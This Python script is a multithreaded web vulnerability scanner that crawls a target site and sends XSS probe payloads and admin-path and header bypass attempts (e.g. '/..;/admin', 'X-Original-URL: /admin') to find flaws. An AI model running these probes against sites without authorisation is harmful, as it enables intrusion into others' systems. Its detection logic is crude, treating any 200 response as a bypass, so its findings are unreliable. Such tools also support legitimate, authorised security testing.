#!/usr/bin/env python3
import sys
import threading
import time
import random
import re
import argparse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from collections import defaultdict

# Check for required libraries
try:
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Style
    from fake_useragent import UserAgent
    from tldextract import extract
except ImportError as e:
    print(f"❌ Error: {e}")
    print("💡 Run: pip install requests beautifulsoup4 colorama fake_useragent tldextract")
    sys.exit(1)

# Initialize Colorama
init(autoreset=True)

# ========== 🎨 UI & LOGGING ==========
class UI:
    @staticmethod
    def banner():
        print(Fore.CYAN + Style.BRIGHT + r"""
╔════════════════════════════════════════════════════════════╗
║    ██████╗ ██████╗ ██╗   ██╗███████╗█████╗ ███████╗      ║
║   ██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗██╔════╝      ║
║   ██║     ██║   ██║██║   ██║█████╗  ██████╔╝███████╗      ║
║   ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║      ║
║   ╚██████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║███████║      ║
║    ╚═════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝      ║
╠════════════════════════════════════════════════════════════╣
║          Advanced Web Vulnerability Scanner v3.1           ║
║                       By HAMA                               ║
╚════════════════════════════════════════════════════════════╝
""")

    @staticmethod
    def status(message, level="info"):
        colors = {
            "info": Fore.BLUE,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED
        }
        symbols = {
            "info": "[ℹ]",
            "success": "[✓]",
            "warning": "[!]",
            "error": "[✗]"
        }
        print(f"{Fore.WHITE}[{time.strftime('%H:%M:%S')}] {colors.get(level, Fore.WHITE)}{symbols.get(level, '')} {message}")

    @staticmethod
    def display_vuln(vuln):
        print("\n" + "═" * 60)
        print(f"{Fore.RED}🔥 {vuln['type']} DETECTED!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 URL:{Style.RESET_ALL} {vuln['url']}")
        
        if vuln['type'] == "XSS":
            print(f"{Fore.CYAN}📦 Payload:{Style.RESET_ALL} {vuln['payload']}")
            if 'parameter' in vuln:
                print(f"{Fore.CYAN}⚙ Parameter:{Style.RESET_ALL} {vuln['parameter']}")
        
        elif vuln['type'] == "Bypass":
            print(f"{Fore.CYAN}🛠 Technique:{Style.RESET_ALL} {vuln['location']}")
            print(f"{Fore.CYAN}📌 Payload:{Style.RESET_ALL} {vuln['payload']}")
            print(f"{Fore.CYAN}🔓 Status:{Style.RESET_ALL} {vuln['status']}")
        
        print(f"{Fore.GREEN}✅ Confidence:{Style.RESET_ALL} {vuln['confidence']}")
        print("═" * 60)

# ========== ⚙ CONFIGURATION ==========
DEFAULT_THREADS = 15
DEFAULT_DEPTH = 3
DEFAULT_TIMEOUT = 10

# ========== 🎯 PAYLOADS ==========
XSS_PAYLOADS = [
    "<script>alert('XSS1')</script>",
    "<img src=x onerror=alert('XSS2')>",
    "'\"><svg/onload=alert('XSS3')>",
    "javascript:alert('XSS4')"
]

BYPASS_PAYLOADS = [
    "/.%2e/admin", "/..;/admin", "//admin/", "/admin..%2f"
]

BYPASS_HEADERS = {
    "X-Original-URL": "/admin",
    "X-Rewrite-URL": "/admin",
    "X-Forwarded-For": "127.0.0.1"
}

# ========== 🛡 SCANNER CORE ==========
class Scanner:
    def __init__(self):
        self.stop_event = threading.Event()
        self.visited = set()
        self.lock = threading.Lock()
        self.results = []
        self.session = requests.Session()
        self.ua = UserAgent()
        self.session.headers.update({'User-Agent': self.ua.random})

    def scan_xss(self, url, html=None):
        parsed = urlparse(url)
        if not html:
            try:
                res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
                html = res.text
            except:
                return

        # Check URL parameters
        if parsed.query:
            for param in parse_qs(parsed.query):
                for payload in XSS_PAYLOADS:
                    test_url = url.replace(f"{param}=", f"{param}={payload}")
                    try:
                        res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                        if payload in res.text:
                            self.results.append({
                                "type": "XSS",
                                "url": test_url,
                                "payload": payload,
                                "parameter": param,
                                "confidence": "High"
                            })
                            UI.display_vuln(self.results[-1])
                    except:
                        continue

        # Check forms
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all('form'):
            try:
                action = form.get('action') or url
                method = form.get('method', 'get').lower()
                inputs = {i.get('name'): i.get('value', '') for i in form.find_all(['input', 'textarea'])}
                
                for payload in XSS_PAYLOADS:
                    data = {k: payload for k in inputs}
                    if method == 'post':
                        res = self.session.post(action, data=data, timeout=DEFAULT_TIMEOUT)
                    else:
                        res = self.session.get(action, params=data, timeout=DEFAULT_TIMEOUT)
                    
                    if payload in res.text:
                        self.results.append({
                            "type": "XSS",
                            "url": action,
                            "payload": payload,
                            "confidence": "Medium"
                        })
                        UI.display_vuln(self.results[-1])
            except:
                continue

    def scan_bypass(self, url):
        # Test path bypasses
        for payload in BYPASS_PAYLOADS:
            test_url = urljoin(url, payload)
            try:
                res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                if res.status_code == 200:
                    self.results.append({
                        "type": "Bypass",
                        "url": test_url,
                        "payload": payload,
                        "location": "Path",
                        "status": res.status_code,
                        "confidence": "Medium"
                    })
                    UI.display_vuln(self.results[-1])
            except:
                continue

        # Test header bypasses
        for header, value in BYPASS_HEADERS.items():
            try:
                headers = {header: value}
                res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
                if res.status_code == 200:
                    self.results.append({
                        "type": "Bypass",
                        "url": url,
                        "payload": f"{header}: {value}",
                        "location": "Header",
                        "status": res.status_code,
                        "confidence": "Medium"
                    })
                    UI.display_vuln(self.results[-1])
            except:
                continue

    def crawl(self, url, depth=3, threads=10):
        if depth <= 0 or self.stop_event.is_set():
            return

        try:
            res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
            
            # Scan current page
            self.scan_xss(url, res.text)
            self.scan_bypass(url)
            
            # Extract and crawl links
            soup = BeautifulSoup(res.text, 'html.parser')
            links = {urljoin(url, a['href']) for a in soup.find_all('a', href=True) 
                    if urlparse(urljoin(url, a['href'])).netloc == urlparse(url).netloc}
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for link in links:
                    if link not in self.visited:
                        self.visited.add(link)
                        executor.submit(self.crawl, link, depth-1, threads)
                        
        except Exception as e:
            UI.status(f"Error scanning {url}: {str(e)}", "error")

# ========== 🚀 MAIN EXECUTION ==========
if __name__ == "__main__":
    UI.banner()
    scanner = Scanner()
    
    parser = argparse.ArgumentParser(description="HAMA's Web Vulnerability Scanner")
    parser.add_argument("url", help="Target URL (e.g., http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="Threads (default: 15)")
    parser.add_argument("-d", "--depth", type=int, default=DEFAULT_DEPTH, help="Crawl depth (default: 3)")
    args = parser.parse_args()

    try:
        UI.status(f"Starting scan on {args.url}", "info")
        scanner.crawl(args.url, depth=args.depth, threads=args.threads)
        
        if not scanner.results:
            UI.status("No vulnerabilities found!", "warning")
        else:
            UI.status(f"Scan complete! Found {len(scanner.results)} vulnerabilities!", "success")
                
    except KeyboardInterrupt:
        UI.status("Scan stopped by user", "error")
    except Exception as e:
        UI.status(f"Fatal error: {e}", "error")
